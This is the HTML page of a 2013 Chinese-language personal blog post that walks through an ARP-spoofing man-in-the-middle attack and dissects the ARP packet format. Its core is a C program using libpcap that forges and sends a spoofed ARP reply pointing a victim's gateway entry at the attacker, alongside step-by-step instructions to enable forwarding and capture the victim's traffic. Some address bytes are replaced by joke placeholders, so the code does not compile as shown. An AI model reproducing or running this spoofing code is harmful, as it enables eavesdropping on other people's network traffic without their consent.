@@ -1,0 +1,294 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>arp欺骗中间人攻击的实现、arp包解析</title>
+    
+    <meta name="author" content="Xinzheng Zhang">
+
+    <!-- Enable responsive viewport -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+    <!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le styles -->
+    <link href="/assets/themes/twitter/bootstrap/css/bootstrap.2.2.2.min.css" rel="stylesheet">
+    <link href="/assets/themes/twitter/css/style.css?body=1" rel="stylesheet" type="text/css" media="all">
+    <link href="/assets/themes/twitter/css/pygments.css?body=1" rel="stylesheet" type="text/css" media="all">
+    <!-- Le fav and touch icons -->
+  <!-- Update these with your own images
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+  -->
+
+    <!-- atom & rss feed -->
+    <link href="" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
+    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">
+
+  </head>
+
+  <body>
+    <div class="navbar">
+      <div class="navbar-inner">
+        <div class="container-narrow">
+          <a class="brand" href="/">Snorlax's blog</a>
+          <ul class="nav">
+            
+            
+            
+
+
+  
+    
+      
+      	
+      	<li><a href="/about.html">about me</a></li>
+      	
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/archive.html">archive</a></li>
+      	
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+
+
+
+
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-narrow">
+
+      <div class="content">
+        
+<div class="page-header">
+  <h1>arp欺骗中间人攻击的实现、arp包解析 </h1>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="date">
+      <span>20 March 2013</span>
+    </div>
+    <div class="content">
+      <p>首先先是了解下什么arp欺骗 可以参加这篇文章http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml<br />
+看完这篇文章我们就可以实施攻击<br />
+1.首先登陆自己的路由器 先对自己准备攻击的机器获得mac地址的信息（在真正攻击时需要用嗅探广发同个子网下的arp广播来获得mac地址）<br />
+2.对被攻击的mac地址绑定静态ip（这步在真正攻击时并不需要、我只是为了方便）<br />
+3.在路由器中进行绑定把被攻击者的ip的绑定到攻击者的mac地址（在真正攻击时对路由器发送欺骗的ARP欺骗响应在之后会说到）<br />
+4.对被攻击者发送arp欺骗应答使之网关的mac地址映射到攻击者的机器上或者简单的 arp -s attack's mac gateway就可以了<br />
+------------------ARP表的设置基本完成----------------------------------------------------------------------------<br />
+接下去需要打开自己网卡的路由功能（这个可以简单的打开共享网络来做到)<br />
+然后开个wireshark什么就安安静静的看着来回所有的数据全给抓到就可以了:P<br />
+------------------上面只是理想情况是你知道路由器密码别的情况你该怎么办？被攻击的人能老老实实给你用他电脑么?------------<br />
+接下去我们要分析下arp数据包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" alt="" title="54A4717D-5EB0-4B9A-9D84-10A71FC0A72C" width="680" height="232" class="alignnone size-full wp-image-299" /></a>
+然后我从真实抓下来的arp进行分析<br />
+首先arp广播包是 42个字节<br />
+arp响应包是60个字节(后面18个我实在没搞明白是什么……反正我乱填也是成功就是的了<br />
+然后我贴代码对这42个字节进行具体分析<br />
+因为socket的封装都在ip之上的……unp上查到的sock_packet我在mac上死活也没找到= =<br />
+不过我发现给在数据连路层上的更好的一组东西:)<br />
+神器不解释啊= =<br />
+详见<br />
+http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</p>
+
+<p><pre lang="c">
+#include <stdlib.h>
+#include <stdio.h /></stdlib.h></pre></p>
+
+<p>#include <pcap.h /></p>
+
+<p>int main(int argc, char **argv) {<br />
+    pcap_t *fp;<br />
+    char error[PCAP_ERRBUF_SIZE];<br />
+    u_char packet[60];<br />
+    int i;<br />
+    <br />
+    /* Check the validity of the command line */<br />
+    if (argc != 2)<br />
+    {<br />
+        printf("usage: %s inerface", argv[0]);<br />
+        return -1;<br />
+    }<br />
+    <br />
+    /* Open the output adapter */<br />
+    if((fp = pcap_open_live("en0", 100, 1, 1000, error) ) == NULL)<br />
+    {<br />
+        fprintf(stderr,"\nError opening adapter: %s\n", error);<br />
+        return -1;<br />
+    }<br />
+    <br />
+    /* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */<br />
+    /*被攻击者的mac*/<br />
+    packet[0]=xx;<br />
+    packet[1]=32;<br />
+    packet[2]=102;<br />
+    packet[3]=8;<br />
+    packet[4]=jiubu;<br />
+    packet[5]=gaosuni;<br />
+    <br />
+    /* set mac source to 2:2:2:2:2:2 */<br />
+    /*攻击者的mac*/<br />
+    packet[6]=jiu;<br />
+    packet[7]=bu;<br />
+    packet[8]=gaosu;<br />
+    packet[9]=234;<br />
+    packet[10]=xx;<br />
+    packet[11]=100;<br />
+    /*arp*/<br />
+    packet[12]=8;<br />
+    packet[13]=6;<br />
+    /*arp首部*/<br />
+    packet[14]=0;<br />
+    packet[15]=1;<br />
+    <br />
+    packet[16]=8;<br />
+    packet[17]=0;<br />
+    <br />
+    packet[18]=6;<br />
+    packet[19]=4;<br />
+    packet[20]=0;<br />
+    packet[21]=2;<br />
+    /*被骗的那个人的arp表上的假mac*/<br />
+    packet[22]=jiu;<br />
+    packet[23]=154;<br />
+    packet[24]=32;<br />
+    packet[25]=bu;<br />
+    packet[26]=253;<br />
+    packet[27]=gao;<br />
+    /*被骗者的网关*/<br />
+    packet[28]=192;<br />
+    packet[29]=168;<br />
+    packet[30]=1;<br />
+    packet[31]=1;<br />
+    /*被攻击者的mac*/<br />
+    packet[32]=xx;<br />
+    packet[33]=32;<br />
+    packet[34]=102;<br />
+    packet[35]=xx;<br />
+    packet[36]=xx;<br />
+    packet[37]=184;<br />
+    /*被攻击者的ip*/<br />
+    packet[38]=192;<br />
+    packet[39]=168;<br />
+    packet[40]=1;<br />
+    packet[41]=114;<br />
+    <br />
+    /* Fill the rest of the packet */<br />
+    /*乱填就好了*/<br />
+    for(i=42;i<60;i++){<br />
+        packet[i]=i%256;<br />
+    }<br />
+    <br />
+    /* Send down the packet */<br />
+    pcap_sendpacket(fp,<br />
+                    packet,<br />
+                    60);<br />
+    <br />
+    return 0;<br />
+}
+</p>
+
+<p>以上arp欺骗的完整实现、不要用来干坏事= =</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+     
+    	<li><a href="#program-ref">
+    		program <span>36</span>
+    	</a></li>
+    
+  
+
+
+    </ul>
+  
+
+  
+
+    <hr>
+    <div class="pagination">
+      <ul>
+      
+        <li class="prev"><a href="/program/2013/03/15/sae-%E6%99%AE%E9%80%9A%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E6%8E%A8%E8%8D%90%E8%AE%A4%E8%AF%81%E6%B4%BB%E5%8A%A83-15-%E8%A7%A3" title="sae 普通开发者免推荐认证活动3.15 解">&larr; Previous</a></li>
+      
+        <li><a href="/archive.html">Archive</a></li>
+      
+        <li class="next"><a href="/life/2013/03/26/%E6%B3%A8%E5%86%8C%E4%BA%86-ask-fm" title="注册了 ask.fm">Next &rarr;</a></li>
+      
+      </ul>
+    </div>
+    <hr>
+    
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'jekyllbootstrap'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+  </div>
+</div>
+
+
+      </div>
+      <hr>
+      <footer>
+        <p>&copy; 2014 Xinzheng Zhang
+          with help from <a href="http://jekyllbootstrap.com" target="_blank" title="The Definitive Jekyll Blogging Framework">Jekyll Bootstrap</a>
+          and <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a>
+        </p>
+      </footer>
+
+    </div>
+
+    
+  </body>
+</html>
+
